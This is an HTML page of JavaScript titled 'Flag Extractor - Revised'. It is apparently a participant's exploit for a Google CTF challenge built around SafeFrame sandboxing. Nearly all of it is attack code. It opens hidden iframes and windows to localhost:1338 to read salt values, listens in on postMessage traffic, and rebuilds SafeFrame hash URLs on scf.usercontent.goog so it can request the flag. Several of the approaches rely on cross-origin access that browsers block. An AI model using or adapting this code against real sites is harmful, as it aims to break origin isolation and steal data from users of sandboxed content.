<!DOCTYPE html>
<html>
<head>
    <title>Flag Extractor - Revised</title>
</head>
<body>
    <div id="status">Initializing exploit...</div>
    <div id="logs"></div>
    
    <script>
        function log(msg) {
            const logs = document.getElementById('logs');
            logs.innerHTML += `<p>${new Date().toISOString()}: ${msg}</p>`;
            console.log(msg);
        }
        
        // Strategy 1: Try to access the main application and read mathRandomInvocations
        async function accessMainApplication() {
            log('Attempting to access main application...');
            
            try {
                // Try different ways to access the main app
                const targets = [
                    'http://localhost:1338',
                    window.location.origin.replace(window.location.hostname, 'localhost:1338'),
                    'http://127.0.0.1:1338'
                ];
                
                for (const target of targets) {
                    try {
                        log(`Trying to access: ${target}`);
                        
                        // Create a hidden iframe to the main app
                        const iframe = document.createElement('iframe');
                        iframe.src = target;
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        
                        // Wait for load and try to access
                        await new Promise((resolve, reject) => {
                            iframe.onload = () => {
                                try {
                                    // Try to access the mathRandomInvocations array
                                    if (iframe.contentWindow && iframe.contentWindow.mathRandomInvocations) {
                                        log('Found mathRandomInvocations!');
                                        const salts = iframe.contentWindow.mathRandomInvocations;
                                        log('Available salts: ' + JSON.stringify(salts));
                                        
                                        // Use the most recent salt (likely the flag's salt)
                                        if (salts.length > 0) {
                                            const flagSalt = salts[salts.length - 1];
                                            log(`Using salt for flag: ${flagSalt}`);
                                            exploitWithKnownSalt(flagSalt);
                                        }
                                        resolve();
                                    } else {
                                        reject(new Error('Cannot access mathRandomInvocations'));
                                    }
                                } catch (e) {
                                    reject(e);
                                }
                            };
                            
                            iframe.onerror = () => reject(new Error('Failed to load iframe'));
                            
                            setTimeout(() => reject(new Error('Timeout')), 5000);
                        });
                        
                        break; // If successful, break out of loop
                        
                    } catch (e) {
                        log(`Failed to access ${target}: ${e.message}`);
                    }
                }
                
            } catch (error) {
                log('Main application access failed: ' + error.message);
            }
        }
        
        // Strategy 2: Try to intercept postMessage communications
        function interceptPostMessages() {
            log('Setting up postMessage interception...');
            
            // Listen for all postMessages
            window.addEventListener('message', (event) => {
                log(`Intercepted message from ${event.origin}:`);
                log(`Data: ${JSON.stringify(event.data)}`);
                
                // Check if this contains flag data
                if (event.data) {
                    const dataStr = JSON.stringify(event.data);
                    if (dataStr.includes('CTF{') || dataStr.includes('flag')) {
                        log('ðŸš© POTENTIAL FLAG FOUND IN MESSAGE: ' + dataStr);
                        alert('Potential flag found: ' + dataStr);
                        document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG FOUND: ${dataStr}</h2>`;
                    }
                }
            });
        }
        
        // Strategy 3: Try to exploit with known salt
        async function exploitWithKnownSalt(salt) {
            log(`Attempting exploit with known salt: ${salt}`);
            
            try {
                // Copy SafeFrame functions
                function arrayToBase36(arr) {
                    return arr.reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0)).toString(36);
                }
                
                function concatBuffers(...buffers) {
                    let length = 0;
                    for (const buf of buffers) {
                        length += buf.byteLength;
                    }
                    const newBuf = new Uint8Array(length);
                    let offset = 0;
                    for (const buf of buffers) {
                        newBuf.set(new Uint8Array(buf), offset);
                        offset += buf.byteLength;
                    }
                    return newBuf.buffer;
                }
                
                async function calculateHash(...parts) {
                    const encoder = new TextEncoder();
                    const newParts = [];
                    for (let i = 0; i < parts.length; i++) {
                        const part = parts[i];
                        if (typeof part === "string") {
                            newParts.push(encoder.encode(part).buffer);
                        } else {
                            newParts.push(part);
                        }
                        if (i < parts.length - 1) {
                            newParts.push(encoder.encode("$@#|").buffer);
                        }
                    }
                    const buffer = concatBuffers(...newParts);
                    const hash = await crypto.subtle.digest("SHA-256", buffer);
                    return arrayToBase36(new Uint8Array(hash)).padStart(50, "0").slice(0, 50);
                }
                
                const product = "google-ctf";
                const encoder = new TextEncoder();
                const saltBuffer = encoder.encode(salt).buffer;
                const hash = await calculateHash(product, saltBuffer, window.origin);
                
                const url = new URL(`https://${hash}-h748636364.scf.usercontent.goog/${product}/shim.html`);
                url.searchParams.set("origin", window.origin);
                
                log(`SafeFrame URL: ${url.toString()}`);
                
                const iframe = document.createElement('iframe');
                iframe.src = url;
                iframe.style.width = '100%';
                iframe.style.height = '400px';
                iframe.style.border = '2px solid red';
                document.body.appendChild(iframe);
                
                iframe.onload = () => {
                    log('SafeFrame loaded, sending flag request...');
                    
                    // Send the flag content request
                    const messageChannel = new MessageChannel();
                    messageChannel.port1.onmessage = (e) => {
                        log('SafeFrame response: ' + JSON.stringify(e.data));
                        if (e.data && typeof e.data === 'string' && e.data.includes('CTF{')) {
                            log('ðŸš© FLAG FOUND: ' + e.data);
                            alert('Flag: ' + e.data);
                            document.getElementById('status').innerHTML = `<h2 style="color: green;">FLAG: ${e.data}</h2>`;
                        }
                    };
                    
                    // Send flag content (the bot adds the actual flag)
                    iframe.contentWindow.postMessage({
                        body: new TextEncoder().encode('CTF{dummy_flag}').buffer,
                        mimeType: 'text/plain',
                        salt: saltBuffer
                    }, url.origin, [messageChannel.port2]);
                };
                
            } catch (error) {
                log('Exploit with known salt failed: ' + error.message);
            }
        }
        
        // Strategy 4: Try to access via window.open and then read state
        function tryWindowOpen() {
            log('Trying window.open approach...');
            
            try {
                const newWindow = window.open('http://localhost:1338', '_blank', 'width=800,height=600');
                
                if (newWindow) {
                    log('Opened new window, waiting for load...');
                    
                    setTimeout(() => {
                        try {
                            if (newWindow.mathRandomInvocations) {
                                log('Found mathRandomInvocations in new window!');
                                const salts = newWindow.mathRandomInvocations;
                                log('Salts: ' + JSON.stringify(salts));
                                
                                if (salts.length > 0) {
                                    exploitWithKnownSalt(salts[salts.length - 1]);
                                }
                            } else {
                                log('Could not access mathRandomInvocations in new window');
                            }
                        } catch (e) {
                            log('Error accessing new window: ' + e.message);
                        }
                    }, 3000);
                } else {
                    log('Could not open new window');
                }
            } catch (error) {
                log('Window.open failed: ' + error.message);
            }
        }
        
        // Execute all strategies
        document.getElementById('status').textContent = 'Running multiple exploit strategies...';
        
        interceptPostMessages();
        accessMainApplication();
        tryWindowOpen();
        
        log('All exploit strategies initiated. Monitoring for results...');
        
        // Also try to trigger any existing functionality
        setTimeout(() => {
            log('Checking for any global variables...');
            if (typeof mathRandomInvocations !== 'undefined') {
                log('Found global mathRandomInvocations: ' + JSON.stringify(mathRandomInvocations));
            }
            
            // Check window object for any useful properties
            for (let prop in window) {
                if (prop.includes('random') || prop.includes('salt') || prop.includes('flag')) {
                    log(`Found potentially useful property: ${prop} = ${window[prop]}`);
                }
            }
        }, 1000);
    </script>
</body>
</html>
